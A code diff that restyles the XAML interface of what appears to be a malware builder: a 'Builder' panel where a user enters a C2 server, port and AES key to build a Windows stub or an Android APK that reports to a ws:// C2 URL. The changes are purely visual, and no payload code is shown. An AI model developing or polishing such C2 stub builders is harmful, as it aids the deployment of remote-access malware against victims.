@@ -10,73 +10,78 @@
         <Grid.RowDefinitions>
             <RowDefinition Height="Auto"/>
             <RowDefinition Height="*"/>
-            <RowDefinition Height="Auto"/>
         </Grid.RowDefinitions>
 
-        <TextBlock Grid.Row="0" Text="Builder" FontSize="24" FontWeight="Bold" Foreground="{StaticResource DeepGreenBrush}" Margin="0,0,0,20"/>
+        <TextBlock Grid.Row="0" Text="Builder" FontSize="26" FontWeight="Bold" Foreground="{StaticResource DeepGreenBrush}" Margin="0,0,0,20"/>
 
-        <TabControl Grid.Row="1" Background="{StaticResource WhiteBrush}" BorderBrush="{StaticResource OffWhiteBrush}">
-            <!-- Windows Tab -->
-            <TabItem Header="Windows Stub">
-                <Grid Margin="20">
-                    <Grid.ColumnDefinitions>
-                        <ColumnDefinition Width="Auto"/>
-                        <ColumnDefinition Width="*"/>
-                    </Grid.ColumnDefinitions>
-                    <Grid.RowDefinitions>
-                        <RowDefinition Height="Auto"/>
-                        <RowDefinition Height="Auto"/>
-                        <RowDefinition Height="Auto"/>
-                        <RowDefinition Height="Auto"/>
-                    </Grid.RowDefinitions>
+        <!-- Main Card -->
+        <Border Grid.Row="1" Background="White" CornerRadius="12" Padding="30">
+            <Border.Effect>
+                <DropShadowEffect Color="#000000" Opacity="0.05" BlurRadius="15" ShadowDepth="2"/>
+            </Border.Effect>
+            
+            <TabControl Background="Transparent" BorderThickness="0">
+                <!-- Windows Tab -->
+                <TabItem Header="Windows Stub">
+                    <Grid Margin="0,20,0,0">
+                        <Grid.ColumnDefinitions>
+                            <ColumnDefinition Width="150"/>
+                            <ColumnDefinition Width="*"/>
+                        </Grid.ColumnDefinitions>
+                        <Grid.RowDefinitions>
+                            <RowDefinition Height="Auto"/>
+                            <RowDefinition Height="Auto"/>
+                            <RowDefinition Height="Auto"/>
+                            <RowDefinition Height="Auto"/>
+                        </Grid.RowDefinitions>
 
-                    <TextBlock Grid.Row="0" Grid.Column="0" Text="C2 Server:" VerticalAlignment="Center" Margin="0,0,10,10"/>
-                    <TextBox Grid.Row="0" Grid.Column="1" Text="{Binding C2Server}" Margin="0,0,0,10"/>
+                        <TextBlock Grid.Row="0" Grid.Column="0" Text="C2 Server:" VerticalAlignment="Center" FontWeight="SemiBold" Foreground="#4B5563" Margin="0,0,0,20"/>
+                        <TextBox Grid.Row="0" Grid.Column="1" Text="{Binding C2Server}" Margin="0,0,0,20"/>
 
-                    <TextBlock Grid.Row="1" Grid.Column="0" Text="C2 Port:" VerticalAlignment="Center" Margin="0,0,10,10"/>
-                    <TextBox Grid.Row="1" Grid.Column="1" Text="{Binding C2Port}" Margin="0,0,0,10"/>
+                        <TextBlock Grid.Row="1" Grid.Column="0" Text="C2 Port:" VerticalAlignment="Center" FontWeight="SemiBold" Foreground="#4B5563" Margin="0,0,0,20"/>
+                        <TextBox Grid.Row="1" Grid.Column="1" Text="{Binding C2Port}" Margin="0,0,0,20"/>
 
-                    <TextBlock Grid.Row="2" Grid.Column="0" Text="AES Key (Base64):" VerticalAlignment="Center" Margin="0,0,10,10"/>
-                    <TextBox Grid.Row="2" Grid.Column="1" Text="{Binding AesKeyBase64}" Margin="0,0,0,10"/>
+                        <TextBlock Grid.Row="2" Grid.Column="0" Text="AES Key (Base64):" VerticalAlignment="Center" FontWeight="SemiBold" Foreground="#4B5563" Margin="0,0,0,20"/>
+                        <TextBox Grid.Row="2" Grid.Column="1" Text="{Binding AesKeyBase64}" Margin="0,0,0,20"/>
 
-                    <Button Grid.Row="3" Grid.Column="1" Content="Generate Key" Command="{Binding GenerateKeyCommand}" HorizontalAlignment="Left" Margin="0,0,0,10"/>
-                </Grid>
-            </TabItem>
+                        <Button Grid.Row="3" Grid.Column="1" Content="Generate New Key" Command="{Binding GenerateKeyCommand}" Style="{StaticResource ActionButton}" HorizontalAlignment="Left" Background="#F3F4F6" Foreground="{StaticResource DeepGreenBrush}"/>
+                    </Grid>
+                </TabItem>
 
-            <!-- Android Tab -->
-            <TabItem Header="Android APK">
-                <Grid Margin="20">
-                    <Grid.ColumnDefinitions>
-                        <ColumnDefinition Width="Auto"/>
-                        <ColumnDefinition Width="*"/>
-                    </Grid.ColumnDefinitions>
-                    <Grid.RowDefinitions>
-                        <RowDefinition Height="Auto"/>
-                        <RowDefinition Height="Auto"/>
-                        <RowDefinition Height="Auto"/>
-                        <RowDefinition Height="Auto"/>
-                    </Grid.RowDefinitions>
+                <!-- Android Tab -->
+                <TabItem Header="Android APK">
+                    <Grid Margin="0,20,0,0">
+                        <Grid.ColumnDefinitions>
+                            <ColumnDefinition Width="150"/>
+                            <ColumnDefinition Width="*"/>
+                        </Grid.ColumnDefinitions>
+                        <Grid.RowDefinitions>
+                            <RowDefinition Height="Auto"/>
+                            <RowDefinition Height="Auto"/>
+                            <RowDefinition Height="Auto"/>
+                        </Grid.RowDefinitions>
 
-                    <TextBlock Grid.Row="0" Grid.Column="0" Text="App Name:" VerticalAlignment="Center" Margin="0,0,10,10"/>
-                    <TextBox Grid.Row="0" Grid.Column="1" Text="{Binding AppName}" Margin="0,0,0,10"/>
+                        <TextBlock Grid.Row="0" Grid.Column="0" Text="App Name:" VerticalAlignment="Center" FontWeight="SemiBold" Foreground="#4B5563" Margin="0,0,0,20"/>
+                        <TextBox Grid.Row="0" Grid.Column="1" Text="{Binding AppName}" Margin="0,0,0,20"/>
 
-                    <TextBlock Grid.Row="1" Grid.Column="0" Text="Package Name:" VerticalAlignment="Center" Margin="0,0,10,10"/>
-                    <TextBox Grid.Row="1" Grid.Column="1" Text="{Binding PackageName}" Margin="0,0,0,10"/>
+                        <TextBlock Grid.Row="1" Grid.Column="0" Text="Package Name:" VerticalAlignment="Center" FontWeight="SemiBold" Foreground="#4B5563" Margin="0,0,0,20"/>
+                        <TextBox Grid.Row="1" Grid.Column="1" Text="{Binding PackageName}" Margin="0,0,0,20"/>
 
-                    <TextBlock Grid.Row="2" Grid.Column="0" Text="C2 URL:" VerticalAlignment="Center" Margin="0,0,10,10"/>
-                    <TextBox Grid.Row="2" Grid.Column="1" Text="{Binding C2Server, StringFormat='ws://{0}'}" IsReadOnly="True" Margin="0,0,0,10"/>
+                        <TextBlock Grid.Row="2" Grid.Column="0" Text="C2 URL:" VerticalAlignment="Center" FontWeight="SemiBold" Foreground="#4B5563" Margin="0,0,0,20"/>
+                        <TextBox Grid.Row="2" Grid.Column="1" Text="{Binding C2Server, StringFormat='ws://{0}'}" IsReadOnly="True" Background="#F9FAFB" Margin="0,0,0,20"/>
+                    </Grid>
+                </TabItem>
+            </TabControl>
+        </Border>
 
-                    <Button Grid.Row="3" Grid.Column="1" Content="Generate Key" Command="{Binding GenerateKeyCommand}" HorizontalAlignment="Left" Margin="0,0,0,10"/>
-                </Grid>
-            </TabItem>
-        </TabControl>
-
-        <!-- Build Buttons -->
-        <StackPanel Grid.Row="2" Orientation="Horizontal" HorizontalAlignment="Right" Margin="0,20,0,0">
-            <Button Content="Build Windows" Command="{Binding BuildWindowsCommand}" Background="{StaticResource MidGreenBrush}" Foreground="White" Padding="15,8" Margin="0,0,10,0"/>
-            <Button Content="Build Android" Command="{Binding BuildAndroidCommand}" Background="{StaticResource MidGreenBrush}" Foreground="White" Padding="15,8"/>
-        </StackPanel>
-
-        <TextBlock Grid.Row="2" Text="{Binding StatusMessage}" VerticalAlignment="Center" Margin="20,0,0,0" Foreground="{StaticResource DarkTextBrush}"/>
+        <!-- Build Buttons Area -->
+        <Grid Grid.Row="2" Margin="0,20,0,0">
+            <StackPanel Orientation="Horizontal" HorizontalAlignment="Right">
+                <Button Content="Build Windows" Command="{Binding BuildWindowsCommand}" Style="{StaticResource ActionButton}" Margin="0,0,15,0"/>
+                <Button Content="Build Android" Command="{Binding BuildAndroidCommand}" Style="{StaticResource ActionButton}"/>
+            </StackPanel>
+            
+            <TextBlock Text="{Binding StatusMessage}" VerticalAlignment="Center" FontWeight="Medium" Foreground="{StaticResource AccentGreenBrush}"/>
+        </Grid>
     </Grid>
 </UserControl>
